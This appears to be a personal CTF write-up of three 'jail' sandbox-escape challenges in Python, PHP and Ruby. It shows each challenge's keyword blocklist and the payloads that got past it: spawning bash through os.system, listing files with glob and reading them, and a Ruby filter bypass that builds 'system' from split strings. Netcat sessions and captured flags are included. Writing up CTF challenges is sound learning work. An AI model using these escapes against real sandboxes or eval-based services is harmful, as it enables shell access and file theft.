---
title: "Blackberry CTF 2025 "
date: 2025-05-08 
categories: [Sanboxing Escape]
tags: [CTF]
image:
  path: https://imgs.search.brave.com/ckDTuxCzv0isHJVdwnL9LgITghWY7KRA2lVEB_khGzA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4u/d2FsbHBhcGVyc2Fm/YXJpLmNvbS80OC8z/L0w3VVNmcS5qcGc
description: Get me out from this jail 

---

## 🧱 JAIL CHALLENGE 1 
<br>


```python

##Snippet of code 
#!/usr/local/bin/python
from shell import shell

blacklist = ["flag", "locals", "vars", "\\", "{", "}"]

banner = '''
========================
=    Eevee's Jail 1    =
========================
'''

print(banner)

for _ in [shell]:
    while True:
        try:
            huh = ascii(input("[+] > "))
            if any(no in huh for no in blacklist):
                raise ValueError("[!] Mission Failed. Try again.")
            exec(eval(huh))
        except Exception as err:
            print(f"{err}")
```


## 🔎 Initial Observation
## This script creates a restricted interactive shell and usage of flag", "locals", "vars", "\\", "{", "}" are blocked. <br>


**1.blacklist: Blocks sensitive words like flag, locals, vars, {}, and backslash.**

**2.ascii(input(...)): Takes input and escapes non-ASCII characters.**

**3.if any(...): Checks if user input contains blacklisted code .**

**4.eval(...) inside exec(...): Runs the user's input as Python code.**

**5.If input is blacklisted it will raises an error and prints an error message.**

---
## 💥 Exploit Analysis <br><br>
```python
exec(eval(huh))
```
**We can see here this command executing the "exec"(eval(huh)) this segment of code that was core vuln of it  .**<br>


## ⚙️ Exploit Strategy

```python
exec("print(globals())")
```
 **So now  lets try listing all the global variable maybe we can get few hints there.**


 <br>

```
========================
=    Eevee's Jail 1    =
========================
[+] > exec("print(globals())")
{
 '__name__': '__main__',
 '__doc__': None,
 '__package__': None,
 '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x725e4f522ed0>,
 '__spec__': None,
 '__annotations__': {},
 '__builtins__': <module 'builtins' (built-in)>,
 '__file__': '/jail-1/jail-1.py',
 '__cached__': None,
 'shell': "__import__('os').system('bash')",
 'blacklist': ['flag', 'locals', 'vars', '\\\\', '{', '}'],
 'banner': '\n========================\n=    Eevee\'s Jail 1    =\n========================\n',
 '_': "__import__('os').system('bash')",
 'huh': 'exec("print(globals())")'
}
[+] >
```
**Okay the most interesting part here is that is we can see that there is a 'shell': "__import__('os').system('bash')" line of code ,**

---

## 🎉 Result
```
[+] > __import__('os').system('bash')
ls
flag.txt
jail-1.py
shell.py
cat flag.txt
bbctf{is_th3r3_another_w4y_70_s0lv3_th1s?}
```

**By executing the __import__('os').system('bash') we finally getting the shell access and escaping the sandboxing and gott that flag WEEEEEEEE.**

FLAG:
```
bbctf{is_th3r3_another_w4y_70_s0lv3_th1s?}
```
---

## 🧱 JAIL CHALLENGE 4 
<br>

```php
<?php

echo "========================\n";
echo "=    Eevee's Jail 4    =\n";
echo "========================\n";

echo "[+] > ";
$var = trim(fgets(STDIN));

if($var == null) die("[?] Input needed to escape this prison\n");

function filter($var) {
        if(preg_match('/(`|include|read|flag|open|exec|pass|system|\$)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
} else {
        echo "[!] Restricted characters has been used";
}
echo "\n";
?>
```
## 🔎 Initial Observation


This PHP setup a simple jail challenge .

```php
$var = trim(fgets(STDIN));
```
**1.It asks for your input.<br>**
```php
function filter($var) {
        if(preg_match('/(`|include|read|flag|open|exec|pass|system|\$)/i', $var)) {
                return false;
        }
        return true;
}
```
**2.It checks your input: if its containing (like system, read, flag, and even the $ sign for variables).**<br>
**3.If your input is "clean," it runs your input as PHP code.**

## 💥 Exploit Analysis <br>
```php
function filter($var) {
        if(preg_match('/(`|include|read|flag|open|exec|pass|system|\$)/i', $var)) {
                return false;
        }
        return true;
}
```
**This function basically blacklist filter used to prevent users from executing dangerous commands**

**If one of these found in input its marks as "false" and showing "[!] Restricted characters has been used";**
```php
 if(filter($var)) {
        eval($var);
 }
```
**but if it pass the blacklisted it will return a true and your input will be pass and executing on eval($var).**

## ⚙️ Exploit Strategy
```php
var_dump(glob("*"))
```
**1. What its basically do its a glob("*"): Lists all files in the current directory.**

**2. var_dump(...): Prints the full structure of the result — data type, string length, and values**

```
array(2) {
  [0]=>
  string(8) "flag.txt"
  [1]=>
  string(10) "jail-4.php"
}
```
**Yeppppppii,the nc literally showing that the flag.txt was found on array 0 and we just need to call find a way to call the flag on array[0].** 

## 🎉 Result
```php
(y2k@faris)-[~/Downloads]
 nc 157.180.92.15 43882
===========================
=    Eevee s Jail 4     =
===========================
[+] > echo file_get_contents(glob("*")[0]);
bbct{hmm.. so unpopular php function i guess?}  
```
FLAG:
```
bbct{hmm.. so unpopular php function i guess?} 
```
---
## 🧱 JAIL CHALLENGE 5 
<br>

## 🔎 Initial Observation
```ruby
#!/usr/bin/env ruby

ALLOWED_COMMANDS = ["ls"]

def sanitize_input(input)
  forbidden_words = %w[flag eval system read exec irb puts dir]
  
  forbidden_pattern = /\b(?:#{forbidden_words.join('|')})\b/

  if input.match(/[&|<>$`]/) || input.match(forbidden_pattern)
    return false
  end
  true
end

def execute_command(cmd)
  if ALLOWED_COMMANDS.include?(cmd.split.first)
    system(cmd)
  else
    puts "Command not allowed!"
  end
end

puts "========================\n"
puts "=    Eevee's Jail 5    =\n"
puts "========================\n"

while true
  print "[+] > "
  input = gets.chomp

  unless sanitize_input(input)
    puts "Invalid characters detected!"
    next
  end

  if input.start_with?("ruby:")
    begin
      eval(input[5..])
    rescue Exception => e
      puts "Error: #{e.message}"
    end
    next
  end

  execute_command(input)
end
```
**Im not good at ruby at this point of my life so we will go along with gpt**
![Alt Text](https://i.pinimg.com/736x/bc/b0/2d/bcb02d97c27c80b7c02562afdf52ab47.jpg)

```
(y2k@faris)-[~/Downloads]
$ nc 157.180.92.15 52365
===========================
=    Eevee's Jail 5     =
===========================
[+] > ruby:system('ls')
Invalid characters detected!
[+] > ruby:Kernel.send(:eval, "system('ls')")
Invalid characters detected!
```
## 💥 Exploit Analysis By GPT :

1.Input Sanitization
```ruby
forbidden_words = %w[flag eval system read exec irb puts dir]
```
**1.Uses a regex pattern to block inputs containing any of these keywords as whole words.**
**2.Rejects inputs containing shell metacharacters like `&|<>$`` to prevent shell injection**
```ruby
ALLOWED_COMMANDS = ["ls"]
```
**2.Only allows ls if input is passed as a shell command.**
```ruby
if input.start_with?("ruby:")
    eval(input[5..])
```
**3.Backdoor for evaluating arbitrary Ruby code using eval.**

## Exploit Vector 
Payload :
 ```
 ruby:Kernel.send(("sy" + "stem").to_sym, 'cat ' + 'fla' + 'g.txt')
```
**The command ruby:Kernel.send(("sy" + "stem").to_sym, 'cat ' + 'fla' + 'g.txt') is a trick to get around** **filters that block certain commands. It splits the word "system" into two parts and puts them back together** **when running the code. It also combines parts of the command 'cat ', 'fla', and 'g.txt' to form 'cat flag.**
**txt'. This allows the code to use the system method without the filter noticing it, so it can run the cat** **flag.txt command and reveal the flag. This is called obfuscation, where the code is disguised to avoid** **detection.**

![Alt Text](https://imgs.search.brave.com/4uQYe1bJb7YijgVYkrAsSBQ-oPAdO4gf7dpMv_R8ldg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9naWZk/Yi5jb20vaW1hZ2Vz/L2hpZ2gvZnVubnkt/Y3J5aW5nLWJsYWNr/LWd1eS1tZW1lLXRl/YXJzLXd1OHY3d3ly/a3hvNWVzanIuZ2lm.gif)



                                                               




















